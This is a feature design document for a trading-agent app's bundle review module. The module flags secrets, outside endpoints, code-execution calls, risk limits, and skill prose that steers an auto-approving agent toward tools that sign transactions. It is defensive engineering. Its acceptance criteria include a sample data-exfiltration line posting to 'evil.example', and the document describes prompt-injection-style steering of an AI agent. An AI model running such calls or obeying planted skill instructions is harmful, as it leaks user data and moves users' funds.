---
id: FEAT-144
title: Review a bundle before it runs — secrets, endpoints, steered tools and the brakes it brings
summary: >-
  FEAT-133's export scrubs three front-matter fields and never looks at file
  content, so a bundle can carry a key, a stranger's endpoint, a skill steering
  the model at a signing tool, or risk limits wider than this install's. Add a
  pure review module, run at export, at import and by the hub.
status: todo
effort: M
risk: medium
brain: developer
new_files:
  - condor/agents/bundle_review.py
  - tests/test_bundle_review.py
touched_files:
  - condor/agents/bundle.py
  - condor/web/routes/agents.py
  - mcp_servers/condor/tools/trading_agent.py
  - frontend/src/components/settings/ImportAgentDialog.tsx
  - frontend/src/lib/api.ts
  - condor/agents/README.md
depends_on:
  - "[[FEAT-133]]"
commits: []
created: 2026-10-15
---

## Objective

Before anything from a bundle is written, and before any of it is unmuted, one
review names what a reader should look at: key-shaped values, endpoints the
agent reaches, instructions steering the model at a tool that signs, code that
executes arbitrary strings, and the risk limits the bundle brings with it.

Done means: a single pure module produces those findings from a parsed bundle;
export refuses on a certainly-secret value and warns on the rest; the import
preview shows the findings beside the file list; and the module is importable by
a server that has never imported Condor's web app, so the hub can re-run exactly
the same review on a submission rather than trusting whoever exported it.

## Context and constraints

**[[FEAT-133]]'s export never looks at file content.** Its scrub rewrites three
AGENT.md front-matter fields — `server_name`, `created_by`,
`forked_from`/`forked_at` — chosen because they are install-local. A skill, a
controller `sample_configs/*.yml`, a routine or a `loop.md` body is carried
verbatim, so an API key, a private RPC URL with a token in its query string or a
wallet address travels with the bundle and nothing says so.

**The detector already exists, is pure, and is already framed for this.**
`condor/runtime/secrets.py` offers `scan(text) -> list[Finding]` (`:365`) and a
`Finding` (`:293`) that carries offsets and deliberately never the value, so a
finding can be logged and counted without becoming the leak it exists to
prevent. Its tiering is already decided at ambiguity: a BIP-39 phrase and a
64-integer keypair array are `certain` because they are nothing else; bare
64-hex and 87–88-char base58 are `certain=False` because they are also a tx
hash and a transaction signature, both routine here. Its own docstring calls its
place "ingress, before anything is written" — an arriving bundle is exactly
that — and it is pure: "no I/O beyond reading the vendored wordlist once, no
logging of anything derived from the text, no state".

**A client-side scrub is not a gate anybody should put sole weight on, and this
repo has the receipts.** Five closed items in the sharing scrubber, each one a
shape it should have caught and did not: [[SEC-230]] in `improvements/backend/`
(a recovery phrase unless
it was pasted single-spaced — the id is reused by an unrelated closed frontend
item), [[SEC-283]] (a bare 64-hex key, "which is how
MetaMask exports them"), [[SEC-331]] and [[SEC-336]] (a Solana keypair arriving
as a JSON list of ints), and [[CORR-245]] (nested values returned verbatim at
the depth cap). The sharing package's own conclusion is in
`condor/sharing/scrub.py`'s docstring: an explicit share "ends in a dialog that
shows the user the exact bytes before anything is sent, so a pattern that
misses is at least visible", and where nobody reads it "**the scrubber is the
last gate**" and needs compensating controls. In the hub case the exporter is
the adversary and runs their own copy of the exporter, so an export-side check
is advice, and the receiving side's check is the one that matters.

**The dangerous half of a bundle is prose, not code.** An agent auto-approves
its own tool calls: `condor/agents/delegate.py:22` states the "chosen
authorization model: full auto-approve, no sandbox (see FEAT-006 Risks)",
gated only by `auto_approve_with_risk_check` against `RiskLimits`. So a skill's
free text is an instruction a signing tool will act on with no human in the
loop. The tool names that move money are already enumerated in one
platform-neutral, stdlib-only module whose docstring forbids it from growing an
import edge back into the runtime: `condor/runtime/danger.py` —
`DANGEROUS_TOOLS` (`:46`), `CREATE_EXECUTOR_TOOLS` (`:24`), `LEVERAGE_TOOL`
(`:43`) and `CODE_RUN_TOOL = "run_code"` (`:225`).

**The brakes travel with the bundle, and nothing clamps them.**
`load_full_config` (`condor/agents/config.py:291`) starts from the strategy
defaults — a loop's `default_config`, which is bundle content — and overlays
`config.yml`, which is runtime output and does not travel. `risk_limits` is an
`AgentConfig` field (`:271`) of type `RiskLimitsConfig` (`:124`), and there is
no install-wide maximum anywhere: a grep for a cap or clamp across
`condor/agents/risk.py` and `condor/preferences.py` returns nothing, and
[[FEAT-139]]'s new `condor/preflight.py` mentions `risk_limits` nowhere.
(These three anchors were first read at `87043ad6` and re-pinned at `77f2300d`
after [[FEAT-139]] landed and moved two of them; the class at `:124` did not
move, and the reading holds at both shas.) So an
imported `loop.md` carrying `max_position_size_quote: 999999` and
`max_open_executors: 50` becomes that agent's guardrails on its first run with
no install-side veto. The shipped library's own figures are the comparison:
`300` and `1` at
`agents/adaptive_grid_trader/loops/btc_usdt_adaptive_grid/loop.md:14`.

**One hazard is already closed and should not be re-solved.** [[FEAT-133]]
refuses a non-UTF-8 file **at export**, so a bundle cannot carry a binary blob
and this review never has to reason about one — the case
`condor/runtime/secrets.py` calls out as unsolvable ("a key that arrives as a
*picture* … reaches the model with nothing here looking at it") cannot arise in
a bundle.

## Alternatives considered

**1. Refuse the import on any finding — a hard gate.** Rejected, and the line
was already drawn: `secrets.py` settled exactly this trade-off one module over
and settled it against eating values, because a bare 64-hex is also a tx hash
and a sha256 digest and refusing them "would break 'check this tx', which is
routine here, on every use". Re-drawing that line here would contradict a
decision this repo made with its reasons written down.

**2. Scrub the content on export, as the sharing scrubber does.** Rejected for
a bundle. The sharing scrubber substitutes pseudonyms into a transcript, where a
mangled string costs nothing. A bundle's files are executable code and
configuration: replacing a string inside `routines/r.py` or a YAML config
produces an agent that silently does not work. `conversations._redact`'s
governing principle — redact by key name, never by value — names value-guessing
as how a redactor "either misses one or mangles a trading pair". Report; never
rewrite.

**3. Sandbox the imported routine instead of reviewing it.** Rejected, and said
plainly so it is a decision rather than an omission. There is no sandbox in this
process today — a routine is imported by `discover_routines_from_path` and runs
in the Condor process, and `run_code` has no isolation either — so this would be
a far larger piece of work, and a review that lands is worth more than a sandbox
that does not. [[FEAT-133]] already decided the same way.

**4. Ask a model whether the skill is trying to manipulate the agent.**
Rejected as the thing that produces findings: a reviewer reading
attacker-controlled instructions is itself injectable by them, it costs a model
call per import, and it cannot be run deterministically by a submission
pipeline. It is allowed later as an *additional* opinion on the hub side; it
never replaces the deterministic findings an operator reads.

## Decision

**One pure module, `condor/agents/bundle_review.py`**, producing an ordered
list of findings over a parsed bundle. Its only imports are the standard library
plus `condor.runtime.secrets` and `condor.runtime.danger`, both of which are
already stdlib-only by their own stated rules — so the module runs inside
Condor's export path, inside its import preview, and inside a server-side
submission pipeline that has never imported FastAPI or Telegram. That
portability is the point: the hub must be able to re-run the receiver's own
review on a submission, and a review it cannot run is a review it will
approximate differently.

Findings carry `path`, `line`, `start`/`end` offsets, `category` and `certain`
— never the matched value, following `secrets.Finding`'s rule exactly.

## Design

### Categories

| category | what it reports | certain |
|---|---|---|
| `secret` | `secrets.scan` over every `files[].text` | passed through from `scan` unchanged |
| `endpoint` | a URL or `host:port` in any file, with loopback and private ranges reported separately from a public host | false |
| `tool_steer` | a `danger.py` name — `DANGEROUS_TOOLS`, `CREATE_EXECUTOR_TOOLS`, `LEVERAGE_TOOL` — appearing in AGENT.md / SKILL.md / loop.md prose or in routine and controller source | false |
| `code_run` | `run_code` (`CODE_RUN_TOOL`), `exec`, `eval`, `__import__`, `subprocess`, and `open(` for writing, in `.py` files | false |
| `risk_limits` | every `default_config.risk_limits` in the bundle, as values | n/a |

`endpoint` splits loopback from public deliberately: an agent reaching the local
Hummingbot API is the normal case, and reaching a stranger's host is the
finding. Conflating them would make the category unreadable in a product whose
every agent talks to `localhost`.

`tool_steer` is a *context* report, not an accusation.
`agents/adaptive_grid_trader/skills/liquidation_guard/SKILL.md` legitimately
says "before calling `create_grid_executor()`", and the only thing that
distinguishes that from an instruction to open a position for somebody else is
the surrounding sentence — so each finding carries its line, and the surface
shows it.

`risk_limits` is reported as values, never as a pass/fail. That is
[[FEAT-139]]'s rule for venue fees applied here: a limit is a judgement the
operator makes, and the useful presentation is the bundle's figure beside the
one this install would otherwise run.

### Where it runs, and what each caller does with it

- **Export** — findings in the result. A `certain` `secret` finding **refuses
  the export**, naming the file and the offset span. An export is the one moment
  the value is still fixable by the person who owns it, and a published bundle
  carrying a live key cannot be unpublished out of somebody's download. This
  mirrors [[FEAT-133]]'s existing loud export refusal for non-UTF-8 rather than
  inventing a new posture. Everything else warns.
- **Import** — findings on `plan()` and in the preview response. **Nothing new
  is refused.** [[FEAT-133]]'s refusals (unknown schema, wrong kind, digest
  mismatch, path traversal) stand, and its mitigation stands: routines and
  skills land muted, nothing is started, and the operator unmutes item by item
  after reading. The findings are what they read.
- **Hub** — the same module, same version, on submission. The contract and the
  badge are [[FEAT-146]]'s; this item owes only that the module can be called
  that way, which the import rules above guarantee.

### Ordering

Findings sort `certain` secrets first, then public endpoints, then `code_run`,
then `tool_steer`, then `risk_limits` — most-decisive first, so a long
`tool_steer` list in a legitimate trading agent never buries a key.

## Implementation plan

1. `condor/agents/bundle_review.py` — the `Finding` shape, the five category
   scanners, `review(bundle) -> list[Finding]`, and the ordering. No import of
   FastAPI, Telegram, `condor.web` or `condor.agents.engine`; assert that in the
   test, the way `tests/test_sharing_scrub.py` asserts the sharing package's own
   separation rule.
2. `condor/agents/bundle.py` — call `review` in `build` (refuse on a `certain`
   secret) and in `plan` (attach findings).
3. `condor/web/routes/agents.py` — findings on the bundle, preview and apply
   responses.
4. `mcp_servers/condor/tools/trading_agent.py` — findings in the export and
   import results.
5. Frontend — `ImportAgentDialog.tsx` renders the findings grouped by category
   with the one-sentence statement that a bundle from an untrusted source is
   untrusted code; `api.ts` types.
6. `tests/test_bundle_review.py` — the criteria below.
7. `condor/agents/README.md` — a short section beside the bundle's.

## Acceptance criteria

- [ ] `review` over a bundle whose `skills/s/SKILL.md` contains a 12-word BIP-39
      phrase returns one `secret` finding with `certain` true, naming that path
      and the phrase's offsets, and the finding does **not** contain the phrase
      text in any field
- [ ] `build` refuses to export an agent whose home contains that phrase, naming
      the file and the span, and writes no bundle
- [ ] `build` succeeds for an agent containing a bare 64-hex string, returning
      one `secret` finding with `certain` false — the `secrets.py` verdict table
      honoured rather than re-drawn
- [ ] A bundle whose `routines/r.py` contains `requests.post("https://evil.example/x")`
      produces one public `endpoint` finding; one containing
      `http://localhost:8000/accounts` produces a loopback `endpoint` finding
      reported in the separate loopback group
- [ ] A bundle whose SKILL.md says "then call `create_grid_executor`" produces
      one `tool_steer` finding carrying that line number, and the line text is
      available to the surface
- [ ] A bundle whose `routines/r.py` contains `exec(` and `subprocess.run`
      produces `code_run` findings for both, and a routine containing neither
      produces none
- [ ] A bundle with a loop whose `default_config.risk_limits` sets
      `max_position_size_quote: 999999` and `max_open_executors: 50` produces a
      `risk_limits` finding reporting both values, with no pass/fail verdict
- [ ] `review` over every agent in the shipped `agents/` tree produces **zero**
      `certain` `secret` findings and zero public `endpoint` findings — a
      standing regression guard on the library itself
- [ ] The ordering puts a `certain` secret first and `risk_limits` last in a
      bundle that produces one of every category
- [ ] `import condor.agents.bundle_review` succeeds in a subprocess whose
      `sys.modules` is then asserted to contain no `fastapi`, no `telegram`, no
      `condor.web` and no `condor.agents.engine` — the portability the hub
      depends on, asserted rather than assumed
- [ ] The import preview carries the same finding list, field for field, that
      `review` returns for the same bundle, and `apply` carries it too —
      [[FEAT-133]]'s one-builder rule extended to findings
- [ ] Importing a bundle with findings still writes the agent: the findings
      refuse nothing on the import side, and the imported routines and skills
      are muted exactly as [[FEAT-133]] requires
- [ ] A finding's offsets slice the right substring out of the file's text,
      asserted by the test doing the slicing itself — the contract
      `secrets.Finding` sets ("a caller that needs the bytes slices
      `text[start:end]` itself")
- [ ] `uv run pytest` reports no failure that is not already failing on the
      merge base: run it on the merge base and on the change in the same turn
      and compare the two lists
- [ ] `cd frontend && npm test` and `cd frontend && npm run build` report no
      failure absent on the merge base, compared the same way

## Risks and notes

- **Measured gate at `87043ad6`** (this workstream's worktree): `make test` =
  `uv run pytest` → **6683 passed, 2 skipped, 0 failed, exit 0 in 105.57 s**;
  `cd frontend && npm test` (`vitest run`) → **220 files, 2286 tests, 0 failed,
  exit 0 in 12.18 s**. Provenance only — both counts move with every item in
  this workstream, so the criteria above are the invariant. Re-measure:
  [[FEAT-139]] landed immediately afterwards and added `tests/test_preflight.py`,
  so the pytest count has already changed.
- **This is best-effort and the copy must say so.** Borrow
  `secrets.py`'s own sentence rather than softening it: the bot warns, it does
  not prevent. The honest claim for an imported bundle is that it arrives inert,
  that every executable file was named before anything was written, and that a
  review found these things — not that it is safe.
- **`tool_steer` will be noisy in a trading library, by construction.** Every
  strategy skill names its executor tool. That is why it is reported with its
  line, ordered last, and never a refusal. If the volume turns out to bury the
  rest, the fix is presentation (collapse by tool name) rather than a cleverer
  matcher — a matcher that tries to tell "call this" from "make it call this"
  is the model-review alternative this item rejected.
- **Unmet requirements are deliberately not a review finding.** Whether this
  install has the connectors, tools, model and skills the agent needs is
  [[FEAT-143]]'s derived `requires` and its `unmet` list. Keeping the two apart
  avoids a second derivation of the same set drifting from the first — the
  hazard [[FEAT-133]] names when it refuses to re-implement `publishable_files`.
- **Risk limits are reported, not clamped.** An install-wide ceiling on
  `RiskLimitsConfig` would be a real improvement and is a separate item: it
  changes behaviour for every agent, imported or not, and belongs nowhere near a
  bundle reader. Do not smuggle one in here.
- `/features/` is excluded by `.gitignore:187` and the docs tracked on this
  branch are force-added, so committing this doc needs `git add -f`.
